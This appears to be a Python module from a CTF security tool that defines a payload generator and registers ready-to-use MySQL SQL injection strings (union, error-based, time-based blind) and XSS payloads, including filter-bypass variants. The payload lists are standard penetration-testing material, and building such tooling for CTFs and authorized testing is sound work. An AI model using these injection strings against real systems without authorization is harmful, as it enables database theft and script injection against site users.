"""
Payload generation base classes for CTF-MCP
Provides unified payload generation framework inspired by CTFCrackTools
"""

from typing import Dict, List, Optional, Any
from dataclasses import dataclass, field
from enum import Enum
from ..utils.security import RiskLevel, dangerous_operation


@dataclass
class PayloadCategory:
    """
    Represents a category of payloads

    Inspired by CTFCrackTools' modular payload system
    """
    name: str
    description: str
    payloads: List[str]
    risk_level: RiskLevel
    references: List[str] = field(default_factory=list)
    tags: List[str] = field(default_factory=list)
    examples: List[str] = field(default_factory=list)


class PayloadType(Enum):
    """Types of payloads"""
    SQL_INJECTION = "sql_injection"
    XSS = "xss"
    COMMAND_INJECTION = "command_injection"
    SSTI = "ssti"
    DESERIALIZATION = "deserialization"
    FILE_INCLUSION = "file_inclusion"
    XXE = "xxe"
    SSRF = "ssrf"
    JWT = "jwt"
    CUSTOM = "custom"


class PayloadGenerator:
    """
    Base class for payload generation

    Features inspired by:
    - CTFCrackTools: Modular payload system
    - hexstrike-ai: Categorized tool organization
    """

    def __init__(self, payload_type: PayloadType):
        self.payload_type = payload_type
        self.categories: Dict[str, PayloadCategory] = {}

    def register_category(self, category: PayloadCategory):
        """Register a payload category"""
        self.categories[category.name] = category

    def list_categories(self) -> List[str]:
        """List all available categories"""
        return list(self.categories.keys())

    def get_category(self, name: str) -> Optional[PayloadCategory]:
        """Get a specific category"""
        return self.categories.get(name)

    def generate(
        self,
        category: str,
        filters: Optional[Dict[str, Any]] = None,
        format: str = "text"
    ) -> str:
        """
        Generate payloads for a category

        Args:
            category: Category name
            filters: Optional filters (e.g., {"dbms": "mysql"})
            format: Output format ("text", "json", "markdown")

        Returns:
            Formatted payload string
        """
        if category not in self.categories:
            available = ", ".join(self.categories.keys())
            return f"Unknown category: {category}\nAvailable: {available}"

        cat = self.categories[category]

        if format == "json":
            return self._format_json(cat)
        elif format == "markdown":
            return self._format_markdown(cat)
        else:
            return self._format_text(cat)

    def _format_text(self, category: PayloadCategory) -> str:
        """Format payloads as plain text"""
        lines = []

        # Warning
        lines.append(self._generate_warning(category.risk_level))
        lines.append("")

        # Header
        lines.append(f"Category: {category.name}")
        lines.append(f"Description: {category.description}")
        lines.append(f"Risk Level: {category.risk_level.value.upper()}")
        lines.append("-" * 60)
        lines.append("")

        # Payloads
        lines.append("Payloads:")
        for i, payload in enumerate(category.payloads, 1):
            lines.append(f"{i}. {payload}")
        lines.append("")

        # Examples
        if category.examples:
            lines.append("Examples:")
            for example in category.examples:
                lines.append(f"  {example}")
            lines.append("")

        # References
        if category.references:
            lines.append("References:")
            for ref in category.references:
                lines.append(f"  - {ref}")
            lines.append("")

        # Tags
        if category.tags:
            lines.append(f"Tags: {', '.join(category.tags)}")

        return '\n'.join(lines)

    def _format_markdown(self, category: PayloadCategory) -> str:
        """Format payloads as markdown"""
        lines = []

        lines.append(f"# {category.name}")
        lines.append("")
        lines.append(f"**Description:** {category.description}")
        lines.append(f"**Risk Level:** {category.risk_level.value.upper()}")
        lines.append("")

        lines.append("## Payloads")
        lines.append("")
        for i, payload in enumerate(category.payloads, 1):
            lines.append(f"{i}. `{payload}`")
        lines.append("")

        if category.examples:
            lines.append("## Examples")
            lines.append("")
            for example in category.examples:
                lines.append(f"```")
                lines.append(example)
                lines.append(f"```")
                lines.append("")

        if category.references:
            lines.append("## References")
            lines.append("")
            for ref in category.references:
                lines.append(f"- {ref}")

        return '\n'.join(lines)

    def _format_json(self, category: PayloadCategory) -> str:
        """Format payloads as JSON"""
        import json

        data = {
            "name": category.name,
            "description": category.description,
            "risk_level": category.risk_level.value,
            "payloads": category.payloads,
            "examples": category.examples,
            "references": category.references,
            "tags": category.tags
        }

        return json.dumps(data, indent=2)

    def _generate_warning(self, risk_level: RiskLevel) -> str:
        """Generate risk warning"""
        warnings = {
            RiskLevel.LOW: "🟢 LOW RISK",
            RiskLevel.MEDIUM: "🟡 MEDIUM RISK",
            RiskLevel.HIGH: "🟠 HIGH RISK",
            RiskLevel.CRITICAL: "🔴 CRITICAL RISK - Use with extreme caution"
        }

        warning = warnings.get(risk_level, "⚠️ UNKNOWN RISK")

        return f"""
{warning}
This payload can be dangerous. Only use for:
- Authorized penetration testing
- CTF competitions
- Security research
- Educational purposes
"""

    def search_payloads(self, keyword: str) -> List[str]:
        """
        Search payloads by keyword

        Args:
            keyword: Search keyword

        Returns:
            List of matching category names
        """
        matches = []
        keyword_lower = keyword.lower()

        for name, category in self.categories.items():
            # Search in name, description, tags
            if (keyword_lower in name.lower() or
                keyword_lower in category.description.lower() or
                any(keyword_lower in tag.lower() for tag in category.tags)):
                matches.append(name)

        return matches

    def get_by_risk_level(self, risk_level: RiskLevel) -> List[str]:
        """
        Get categories by risk level

        Args:
            risk_level: Risk level to filter by

        Returns:
            List of category names
        """
        return [
            name for name, cat in self.categories.items()
            if cat.risk_level == risk_level
        ]


class SQLInjectionPayloads(PayloadGenerator):
    """
    SQL Injection payload generator

    Organized by technique and database type
    """

    def __init__(self):
        super().__init__(PayloadType.SQL_INJECTION)
        self._register_payloads()

    def _register_payloads(self):
        """Register SQL injection payloads"""

        # Union-based MySQL
        self.register_category(PayloadCategory(
            name="union_mysql",
            description="MySQL Union-based SQL Injection",
            risk_level=RiskLevel.HIGH,
            payloads=[
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT username,password FROM users--",
                "' UNION SELECT table_name,NULL FROM information_schema.tables--",
            ],
            references=[
                "https://portswigger.net/web-security/sql-injection/union-attacks"
            ],
            tags=["mysql", "union", "injection"],
            examples=[
                "http://example.com/product?id=1' UNION SELECT username,password FROM users--"
            ]
        ))

        # Error-based MySQL
        self.register_category(PayloadCategory(
            name="error_mysql",
            description="MySQL Error-based SQL Injection",
            risk_level=RiskLevel.HIGH,
            payloads=[
                "' AND extractvalue(1,concat(0x7e,version()))--",
                "' AND updatexml(1,concat(0x7e,database()),1)--",
                "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--",
            ],
            references=[
                "https://portswigger.net/web-security/sql-injection/blind"
            ],
            tags=["mysql", "error-based", "injection"]
        ))

        # Time-based blind
        self.register_category(PayloadCategory(
            name="time_mysql",
            description="MySQL Time-based Blind SQL Injection",
            risk_level=RiskLevel.MEDIUM,
            payloads=[
                "' AND SLEEP(5)--",
                "' AND IF(1=1,SLEEP(5),0)--",
                "' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--",
            ],
            references=[
                "https://portswigger.net/web-security/sql-injection/blind"
            ],
            tags=["mysql", "time-based", "blind", "injection"]
        ))


class XSSPayloads(PayloadGenerator):
    """XSS payload generator"""

    def __init__(self):
        super().__init__(PayloadType.XSS)
        self._register_payloads()

    def _register_payloads(self):
        """Register XSS payloads"""

        # Basic XSS
        self.register_category(PayloadCategory(
            name="basic_html",
            description="Basic HTML Context XSS",
            risk_level=RiskLevel.HIGH,
            payloads=[
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>',
                '<body onload=alert(1)>',
                '<iframe src="javascript:alert(1)">',
            ],
            references=[
                "https://portswigger.net/web-security/cross-site-scripting"
            ],
            tags=["xss", "html", "basic"]
        ))

        # Filter bypass
        self.register_category(PayloadCategory(
            name="bypass",
            description="XSS Filter Bypass Techniques",
            risk_level=RiskLevel.HIGH,
            payloads=[
                '<ScRiPt>alert(1)</ScRiPt>',
                '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>',
                '<svg/onload=alert(1)>',
                '<img src=x onerror="alert`1`">',
                '<<script>alert(1)</script>',
            ],
            references=[
                "https://portswigger.net/web-security/cross-site-scripting/contexts"
            ],
            tags=["xss", "bypass", "filter"]
        ))
